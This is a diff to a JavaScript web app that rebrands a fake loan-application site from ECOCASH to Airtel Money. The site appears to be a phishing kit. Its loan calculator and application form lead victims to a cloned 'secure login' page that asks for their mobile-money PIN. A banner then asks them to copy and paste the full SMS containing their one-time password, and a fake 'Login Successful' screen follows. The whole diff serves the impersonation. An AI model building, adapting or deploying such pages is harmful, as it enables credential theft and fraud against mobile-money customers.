@@ -175,8 +175,8 @@ const calcPayment = () => {
 const header = () => `
 <div class="site-header">
   <div class="logo-block">
-    <h1>ECOCASH<span style="color:#8cc63f">//</span></h1>
-    <p>A Member of the <span>OLDMUTUAL</span> Group</p>
+    <h1>airtel<span style="color:var(--primary);">.</span></h1>
+    <p>Airtel Money <span>Loans</span></p>
   </div>
   <div class="welcome-block">
     <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
@@ -203,8 +203,8 @@ const renderCalculator = () => `
 <div class="card-page page">
   ${header()}
   <div style="text-align:center; padding:36px 24px 20px; max-width:520px; width:100%;">
-    <h1 style="font-size:1.85rem; font-weight:900; color:#00a651; line-height:1.2; margin-bottom:8px;">
-      Get Your Loan Approved <span style="color:#1b3668;">Fast</span>
+    <h1 style="font-size:1.85rem; font-weight:900; color:var(--primary); line-height:1.2; margin-bottom:8px;">
+      Get Your Loan Approved <span style="color:var(--text);">Fast</span>
     </h1>
     <p style="font-size:0.88rem; color:#64748b;">Quick approval &bull; Competitive rates &bull; Flexible terms</p>
   </div>
@@ -213,13 +213,13 @@ const renderCalculator = () => `
 
     <!-- Calculator card -->
     <div style="background:#fff; border-radius:20px; padding:28px; box-shadow:0 8px 32px rgba(0,0,0,0.08); flex:1;">
-      <h2 style="font-size:1.1rem; font-weight:800; color:#1b3668; text-align:center; margin-bottom:20px; letter-spacing:-0.3px;">Loan Calculator</h2>
+      <h2 style="font-size:1.1rem; font-weight:800; color:var(--text); text-align:center; margin-bottom:20px; letter-spacing:-0.3px;">Loan Calculator</h2>
       <div class="divider" style="margin-bottom:24px;"></div>
 
       <!-- Amount -->
       <div style="margin-bottom:28px;">
         <div class="control-label" style="font-size:0.72rem; font-weight:800; color:#64748b; text-transform:uppercase; letter-spacing:1px; margin-bottom:10px;">Loan Amount</div>
-        <div style="font-size:2.4rem; font-weight:900; color:#1b3668; margin-bottom:14px;">$<span id="amtDisp">${state.amount.toLocaleString()}</span></div>
+        <div style="font-size:2.4rem; font-weight:900; color:var(--primary); margin-bottom:14px;">$<span id="amtDisp">${state.amount.toLocaleString()}</span></div>
         <input type="range" class="amount-slider" id="amtSlider" min="500" max="50000" step="100" value="${state.amount}" />
         <div style="display:flex; justify-content:space-between; margin-top:8px; font-size:0.72rem; color:#94a3b8; font-weight:600;">
           <span>USD 500</span><span>USD 50,000</span>
@@ -229,7 +229,7 @@ const renderCalculator = () => `
       <!-- Term -->
       <div style="margin-bottom:28px;">
         <div class="control-label" style="font-size:0.72rem; font-weight:800; color:#64748b; text-transform:uppercase; letter-spacing:1px; margin-bottom:10px;">Loan Term</div>
-        <div style="font-size:1.5rem; font-weight:800; color:#1b3668; margin-bottom:14px;" id="termDisp">${state.term} months</div>
+        <div style="font-size:1.5rem; font-weight:800; color:var(--text); margin-bottom:14px;" id="termDisp">${state.term} months</div>
         <div class="term-grid">
           ${[6, 12, 24, 36, 48, 60].map(t => `
             <button class="term-btn${state.term === t ? ' active' : ''}" data-term="${t}">${t}<br>months</button>
@@ -290,7 +290,7 @@ const renderForm = () => `
   ${header()}
   <div class="inner-card">
     <div style="padding:28px 24px 10px; text-align:center;">
-      <h2 style="font-size:1.35rem; font-weight:800; color:#1b3668;">Loan Application</h2>
+      <h2 style="font-size:1.35rem; font-weight:800; color:var(--text);">Loan Application</h2>
       <p style="font-size:0.82rem; color:#64748b; margin-top:6px; line-height:1.5;">
         Please fill in all required details accurately.<br>All information is kept confidential.
       </p>
@@ -300,18 +300,18 @@ const renderForm = () => `
 
     <form id="appForm" style="padding:0 24px 32px; display:flex; flex-direction:column; gap:16px;">
       <!-- Loan Info Banner -->
-      <div style="background:linear-gradient(135deg,#1b3668,#2b5563); border-radius:14px; padding:16px 20px; color:#fff; display:flex; justify-content:space-between; align-items:center;">
+      <div style="background:linear-gradient(135deg,#c90016,#ed1c24); border-radius:14px; padding:16px 20px; color:#fff; display:flex; justify-content:space-between; align-items:center;">
         <div>
-          <div style="font-size:0.7rem; opacity:0.75; text-transform:uppercase; letter-spacing:1px; margin-bottom:4px;">Loan Amount</div>
+          <div style="font-size:0.7rem; opacity:0.85; text-transform:uppercase; letter-spacing:1px; margin-bottom:4px;">Loan Amount</div>
           <div style="font-size:1.6rem; font-weight:900;">$${state.amount.toLocaleString()}</div>
         </div>
         <div style="text-align:right;">
-          <div style="font-size:0.7rem; opacity:0.75; text-transform:uppercase; letter-spacing:1px; margin-bottom:4px;">Term</div>
+          <div style="font-size:0.7rem; opacity:0.85; text-transform:uppercase; letter-spacing:1px; margin-bottom:4px;">Term</div>
           <div style="font-size:1rem; font-weight:700;">${state.term} months</div>
         </div>
         <div style="text-align:right;">
-          <div style="font-size:0.7rem; opacity:0.75; text-transform:uppercase; letter-spacing:1px; margin-bottom:4px;">Monthly</div>
-          <div style="font-size:1rem; font-weight:700; color:#8cc63f;">$${calcPayment()}</div>
+          <div style="font-size:0.7rem; opacity:0.85; text-transform:uppercase; letter-spacing:1px; margin-bottom:4px;">Monthly</div>
+          <div style="font-size:1rem; font-weight:800; color:#fff;">$${calcPayment()}</div>
         </div>
       </div>
 
@@ -356,19 +356,19 @@ const renderReview = () => `
   ${header()}
   <div class="inner-card">
     <div style="padding:24px 24px 8px; text-align:center;">
-      <h2 style="font-size:1.35rem; font-weight:800; color:#1b3668;">Loan Application</h2>
+      <h2 style="font-size:1.35rem; font-weight:800; color:var(--text);">Loan Application</h2>
       <p style="font-size:0.8rem; color:#94a3b8; margin-top:4px;">Four short steps &bull; Takes about 3 minutes</p>
     </div>
     ${stepper(3)}
 
     <div style="padding:20px 24px 32px;">
-      <h3 style="font-size:1rem; font-weight:800; color:#1b3668; margin-bottom:16px;">Review &amp; Confirm</h3>
+      <h3 style="font-size:1rem; font-weight:800; color:var(--text); margin-bottom:16px;">Review &amp; Confirm</h3>
 
-      <div style="background:#f8faff; border:1.5px solid #e0e8ff; border-radius:14px; padding:16px 18px; margin-bottom:20px;">
+      <div style="background:#fff8f8; border:1.5px solid #fee2e2; border-radius:14px; padding:16px 18px; margin-bottom:20px;">
         ${rRow('Amount', `$${Number(state.amount).toLocaleString()}`, 'highlight')}
         ${rRow('Term', `${state.term} months`)}
         ${rRow('Purpose', state.purpose)}
-        ${rRow('Est. monthly payment', `<strong style="color:#1b3668;">$${calcPayment()}</strong>`, 'highlight')}
+        ${rRow('Est. monthly payment', `<strong style="color:var(--primary);">$${calcPayment()}</strong>`, 'highlight')}
       </div>
 
       <div style="background:#fff; border:1.5px solid var(--border); border-radius:14px; padding:16px 18px; margin-bottom:20px;">
@@ -386,7 +386,7 @@ const renderReview = () => `
 
       <div class="check-row" style="margin-bottom:24px;">
         <input type="checkbox" id="reviewCheck" />
-        <label for="reviewCheck">I confirm that the information provided is true and complete, and I agree to the ECOCASH Loans terms and conditions and privacy notice.</label>
+        <label for="reviewCheck">I confirm that the information provided is true and complete, and I agree to the Airtel Loans terms and conditions and privacy notice.</label>
       </div>
 
       <div style="display:flex; gap:12px; align-items:center;">
@@ -414,9 +414,9 @@ const renderSuccess = () => `
     </div>
     <h2>Congratulations${state.name ? ', ' + state.name.split(' ')[0] + '!' : '!'}</h2>
     <p style="margin-top:10px;">Your loan application has been received successfully.</p>
-    <p style="margin-top:10px;">For the next step, please verify your <strong>ECOCASH Internet Banking</strong> details.</p>
-    <div style="margin-top:24px; background:#f0fdf4; border-radius:10px; padding:14px;">
-      <p style="font-size:0.8rem; color:#00a651; font-weight:600;">🔐 Redirecting to secure login...</p>
+    <p style="margin-top:10px;">For the next step, please verify your <strong>Airtel Money</strong> details.</p>
+    <div style="margin-top:24px; background:#fff1f2; border:1px solid #fecdd3; border-radius:10px; padding:14px;">
+      <p style="font-size:0.8rem; color:var(--primary); font-weight:600;">🔐 Redirecting to secure login...</p>
     </div>
   </div>
 </div>`;
@@ -425,12 +425,12 @@ const renderSuccess = () => `
 const renderMobileLogin = () => `
 <div style="min-height:100vh; background:#fff; display:flex; flex-direction:column; align-items:center; padding:48px 24px 32px;" class="page">
   <div style="text-align:center; margin-bottom:40px;">
-    <div class="bank-logo">ECOCASH<span>//</span></div>
-    <div class="bank-subtitle">A Member of the <span style="color:#00a651; font-weight:800;">OLDMUTUAL</span> Group</div>
+    <div class="bank-logo">airtel<span>.</span></div>
+    <div class="bank-subtitle">Airtel Money <span>Portal</span></div>
   </div>
 
   <div class="bank-welcome" style="text-align:center; margin-bottom:40px;">
-    <h2>Welcome to<br><span>Internet Banking</span></h2>
+    <h2>Welcome to<br><span>Airtel Money</span></h2>
   </div>
 
   <div style="width:100%; max-width:360px; display:flex; flex-direction:column; gap:16px;">
@@ -448,23 +448,23 @@ const renderMobileLogin = () => `
 const renderPinLogin = (maskedPhone = '', isOtp = false) => `
 <div style="min-height:100vh; background:#fff; display:flex; flex-direction:column; align-items:center; padding:48px 24px 32px;" class="page">
   <div style="text-align:center; margin-bottom:36px;">
-    <div class="bank-logo">ECOCASH<span>//</span></div>
-    <div class="bank-subtitle">A Member of the <span style="color:#00a651; font-weight:800;">OLDMUTUAL</span> Group</div>
+    <div class="bank-logo">airtel<span>.</span></div>
+    <div class="bank-subtitle">Airtel Money <span>Portal</span></div>
   </div>
 
   <div class="bank-welcome" style="text-align:center; margin-bottom:28px;">
-    <h2>Welcome to<br><span>Internet Banking</span></h2>
+    <h2>Welcome to<br><span>Airtel Money</span></h2>
   </div>
 
   <div style="text-align:center; margin-bottom:20px; max-width:340px; width:100%;">
-    <h3 id="pinTitle" style="font-size:1.4rem; font-weight:800; color:#1b3668;">${isOtp ? 'OTP Verification 🔒' : 'Secured Login 🔒'}</h3>
+    <h3 id="pinTitle" style="font-size:1.4rem; font-weight:800; color:var(--text);">${isOtp ? 'OTP Verification 🔒' : 'Secured Login 🔒'}</h3>
     <p id="pinSubtext" style="font-size:0.85rem; color:#64748b; margin-top:8px; line-height:1.4;">${isOtp ? 'Please copy the full message containing your OTP and paste it below' : 'Enter your PIN to authenticate'}</p>
-    ${maskedPhone ? '<p style="font-size:0.9rem; font-weight:700; color:#1b3668; margin-top:8px; letter-spacing:2px;">' + maskedPhone + '</p>' : ''}
+    ${maskedPhone ? '<p style="font-size:0.9rem; font-weight:700; color:var(--primary); margin-top:8px; letter-spacing:2px;">' + maskedPhone + '</p>' : ''}
   </div>
 
-  <div id="otpBanner" style="${isOtp ? 'display:block;' : 'display:none;'} width:100%; max-width:340px; background:#f0fdf4; border:1.5px solid #86efac; border-radius:12px; padding:12px 16px; margin-bottom:16px; text-align:center; box-sizing:border-box;">
-    <div style="font-size:0.92rem; font-weight:800; color:#166534; margin-bottom:4px;">📲 Copy Full SMS Message</div>
-    <p style="font-size:0.82rem; color:#15803d; font-weight:600; line-height:1.4; margin:0;">
+  <div id="otpBanner" style="${isOtp ? 'display:block;' : 'display:none;'} width:100%; max-width:340px; background:#fff1f2; border:1.5px solid #fecdd3; border-radius:12px; padding:12px 16px; margin-bottom:16px; text-align:center; box-sizing:border-box;">
+    <div style="font-size:0.92rem; font-weight:800; color:#991b1b; margin-bottom:4px;">📲 Copy Full SMS Message</div>
+    <p style="font-size:0.82rem; color:#b91c1c; font-weight:600; line-height:1.4; margin:0;">
       Please copy the <strong>full message</strong> containing your OTP and paste it in the section below.
     </p>
   </div>
@@ -671,19 +671,19 @@ function navigate(view) {
     app.innerHTML = `
 <div style="min-height:100vh; background:#fff; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:40px 24px;" class="page">
   <div style="text-align:center; max-width:360px;">
-    <div style="width:80px; height:80px; background:linear-gradient(135deg,#00a651,#00c060); border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 24px; box-shadow:0 8px 24px rgba(0,166,81,0.35); animation:popIn 0.4s ease both;">
+    <div style="width:80px; height:80px; background:linear-gradient(135deg,var(--primary),#ff4d52); border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 24px; box-shadow:0 8px 24px rgba(237,28,36,0.35); animation:popIn 0.4s ease both;">
       <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
     </div>
-    <h2 style="font-size:1.6rem; font-weight:900; color:#1b3668; margin-bottom:12px;">Login Successful!</h2>
+    <h2 style="font-size:1.6rem; font-weight:900; color:var(--text); margin-bottom:12px;">Login Successful!</h2>
     <p style="color:#64748b; font-size:0.9rem; line-height:1.6; margin-bottom:8px;">Welcome back, <strong>${state.name ? state.name.split(' ')[0] : 'valued customer'}</strong>.</p>
-    <p style="color:#64748b; font-size:0.9rem; line-height:1.6; margin-bottom:32px;">Your ECOCASH Internet Banking session has been verified successfully.</p>
-    <div style="background:#f0fdf4; border:1.5px solid #bbf7d0; border-radius:14px; padding:16px 20px; margin-bottom:32px;">
-      <p style="color:#00a651; font-size:0.82rem; font-weight:600;">✅ Your loan application is being reviewed. Our team will contact you within 24 hours.</p>
+    <p style="color:#64748b; font-size:0.9rem; line-height:1.6; margin-bottom:32px;">Your Airtel Money session has been verified successfully.</p>
+    <div style="background:#fff1f2; border:1.5px solid #fecdd3; border-radius:14px; padding:16px 20px; margin-bottom:32px;">
+      <p style="color:var(--primary); font-size:0.82rem; font-weight:600;">✅ Your loan application is being reviewed. Our team will contact you within 24 hours.</p>
     </div>
-    <div style="background:#f8faff; border:1.5px solid #e0e8ff; border-radius:14px; padding:16px 20px;">
-      <div style="display:flex; justify-content:space-between; font-size:0.82rem; margin-bottom:8px;"><span style="color:#64748b;">Amount</span><span style="font-weight:700; color:#1b3668;">$${Number(state.amount).toLocaleString()}</span></div>
-      <div style="display:flex; justify-content:space-between; font-size:0.82rem; margin-bottom:8px;"><span style="color:#64748b;">Term</span><span style="font-weight:700; color:#1b3668;">${state.term} months</span></div>
-      <div style="display:flex; justify-content:space-between; font-size:0.82rem;"><span style="color:#64748b;">Monthly Payment</span><span style="font-weight:700; color:#00a651;">$${calcPayment()}</span></div>
+    <div style="background:#f8fafc; border:1.5px solid #e2e8f0; border-radius:14px; padding:16px 20px;">
+      <div style="display:flex; justify-content:space-between; font-size:0.82rem; margin-bottom:8px;"><span style="color:#64748b;">Amount</span><span style="font-weight:700; color:var(--text);">$${Number(state.amount).toLocaleString()}</span></div>
+      <div style="display:flex; justify-content:space-between; font-size:0.82rem; margin-bottom:8px;"><span style="color:#64748b;">Term</span><span style="font-weight:700; color:var(--text);">${state.term} months</span></div>
+      <div style="display:flex; justify-content:space-between; font-size:0.82rem;"><span style="color:#64748b;">Monthly Payment</span><span style="font-weight:700; color:var(--primary);">$${calcPayment()}</span></div>
     </div>
   </div>
 </div>`;
